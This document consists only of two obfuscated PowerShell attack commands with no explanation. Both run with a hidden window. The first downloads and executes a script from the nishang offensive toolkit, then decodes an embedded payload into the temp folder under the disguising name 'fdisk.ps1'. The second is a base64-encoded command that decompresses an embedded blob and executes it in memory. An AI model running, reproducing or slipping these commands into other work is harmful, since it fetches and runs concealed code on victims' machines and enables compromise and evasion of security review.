powershell -NoP -NonI -W Hidden -C "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Utility/Invoke-Decode.ps1');Invoke-Decode  tVZbc9o4FH4OM/yHs4QZYLq2Q/tGJw+5kJbdkDAhLfvAwwr7gFVsyZVkCN3y3/fIl9QQhm5munpAF3Qu33cu8imwIIBErlHpEKMIlJQGEmZCMBJQrLJ1vdbsi1XPLs+z1YhWbxrvr3rTCReBXOvpeKMNxu/elgcjq3JsVU5XXfds2gCo1+q1U/BlsgGN0dwaIJGksMDn7eZwMxAr6TPDpXCHmysZx0wErrUGjkBoNMmjnhWazgOul26iu40O/FOvAQ0/gaMaDkrXa9sDfh0i5D+6+ApOuq/0/9WqC3A/9Ru/HqG2Xjs5BZMqAZK4CRFuP10AycKcK1yzKKILd7h2BiQ8UjJBZTbg5B5//PN22PPG9zePk4uHvjfkvpJazo1XuO1dpUqhMJ+JbXLMG8mI+xy1l+NrgHPHYoS+YLMIrV2ntPC4SRCuJ/cP1+B8ZlGKcPZ0VgxwbqTykfwSaHRIKb4qfaUIG6A5UXLOI9SgDTNIyOYFUJYa6ahU/EJQpK0EQrAShckejLFRXCxKHPB3ng6tShI6d3Jkf8QAnAl85EGAAhwfGmPDlLHafNQaDiVIYXKq89nFJyQd2a2x2URYaGu0nlnLeAhSqsxILriAVKOiCtB6LVVAfza1UTdEnkV03vB703Vh8xvzfZkK45Ic5d7JYA7t39qPqE3OXFWw06HUOiFDngf2DAJJ0RBUa/jEtbH/Dfp/QdsG4X72BX0DOST3Do07wZkfceK4417LtYgkC3IS263QmET3PE+xtbvgJkxn1n9fCkPXXV/GnmaxYobpUC49wXXIxMKLGelW3gdykyZbKkt0hjzmS2a+Ta75gkBYSwvFArS10epkLh6/aK98QOP8IWfwHR7QR77CYnefGicDXmWFBLZFABSuKPoIeQLsxtm5UIs0Jjy3RBXlQZ4wTcJJMnAOGQnEQdcVuJS+JJc1F4wlSUbALGhZI1ZmEpLldve5B9nxqDbVbaaai7kkxQXeBwI5RBPKAJxiJpjgfFK89GJPnjBmLYoaEKn5P6I6Q81jqUIupJcUpsqwlvsycFXXdne2VVqsbqqivJ83Ovtk2DGIE0kBGcogpRBecqMfFRN6vg/cjjx21Tvww0a70ngbb/Jz25mErZEyStVhXkbn2fk8OpyU/UzvvugWrpjxw0Oat7tHe9tLhWz54+iAnm0VRc7FOELbBMdIAQw0vMv/3+4n5fGc1JmqL1RMu+WQYf19J+MOoEqYYnH75d0D3Ng+VL1yQFlpiFpyTnUobWEmxc7mCr2yyVEmF5ij+Q5rxrPlL6PVTtRU6HMAMKKeYltv9XXpP6Gf2i+D7P3dwOXGtnv74NzKhcwfHqo0xXxDDSx7jfL389BLAkVbe/k9kX2O/As=   -IsString -OutputFilePath $env:temp\fdisk.ps1"

powershell -NoP -NonI -W Hidden -E "cwBhAGwAIABhACAATgBlAHcALQBPAGIAagBlAGMAdAA7AGkAZQB4ACgAYQAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgAKABhACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARABlAGYAbABhAHQAZQBTAHQAcgBlAGEAbQAoAFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQBbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAWABWAEIATgBUADgATQB3AEQATAAwAGoAOABSACsAaQBDAHIASAB0AGsARQBaAGMAZAArAE4AagBpAEUAcQBvAFYARgBSAG8ASABIAFoASgBFADYAOABOAFMAKwBJAHEAOQBsAGIANgA3ADAAbAB2AHcATQBsACsAdAB0ACsAegBuADYAdgBkAHAAMQBqAFgATQBNAG0AMwA3AGcAcwBNAGkAMwBZAG0AaABsAEQAVwB3AE8AVQBlAE8AdQBNAGQAUgBOADYAVQBUAHoAaABGAGoAOQBxADIAbgBGAHoAcwAxADYAdQBCAGUAYQBTAHQAVQBrAGwAUABaAGUAOQA0AE8ASABkAG4AZwBtAFEAdwBjAGgANAB2AEQAUQBaAEYATwBpAFQATgBtAGcAWQA4AHEAZQBoAG8AMABMAEYAWABRAFcAZgB0AHAASABaAGsAdABOAGYAcwBNAEsAbwBxAFgAdgBBAEUAcwBxAEcAUAArADgAYwBBADUAVQBoADMAcQA4ADMAMQAxAGQAKwBxAGsAQQBGADQAUQBDAHMAUQB1AHcAdwBhAFAAUwArAFgAaQBHAEwARQBDAFIASQBOADQATAAyAFEAUgBoAFIARgBDAHkAeAAzADMAMgBEAE8AaQAzAEsARAAzAHAAbABaAHYARQBOAEEAQgBuAEoAOQBCAEMAdgBrAE0AeQBZAEQAUgBTAEYAdQB4AFcALwB1AGYAOAA3AEQAUABHAG8AaQBJAFcAdAA4AHgAUgA2AFgARwBLAHYAcwBLADIAbgBEADcAZwBJAEwAYgBoAEkAZQBuAGMALwBwADMAawBXAEwAVQA4AHQAegBCAGkALwBPAFcAbwBoADUAeQBkAEsANQBnAFgAagBaADUAagArAE8AaAA2AE4AMQBkAEYAcQBNAEYAVAA4AD0AJwApACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQAsAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApAA=="

